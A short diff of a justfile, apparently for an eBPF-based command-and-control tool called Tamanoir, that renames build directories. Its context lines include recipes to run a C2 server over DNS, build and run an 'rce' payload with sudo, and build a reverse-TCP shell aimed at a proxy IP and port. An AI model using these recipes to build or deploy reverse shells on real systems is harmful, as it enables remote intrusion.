@@ -4,7 +4,7 @@ _default:
 
 
 _build-ebpf:
-    cd tamanoir-ebpf && cargo build --release
+    cd ebpf && cargo build --release
 
 
 # Build Tamanoir
@@ -32,10 +32,10 @@ c2 rce="hello" target_arch="x86_64" dns_ip="8.8.8.8" port="53" payload_len="8" l
 
 
 _build-rce payload="hello":
-    cd tamanoir-rce &&  just build {{payload}} && cargo build  --release
+    cd rce &&  just build {{payload}} && cargo build  --release
 
 _run-rce:
-    cd tamanoir-rce && sudo -E target/release/tamanoir-rce
+    cd rce && sudo -E target/release/tamanoir-rce
 
 _build_reverse_shell proxy_ip="192.168.1.15" rce_port="8082":
     IP=$(just _atoi {{proxy_ip}}) PORT={{rce_port}} just _build-rce reverse-tcp
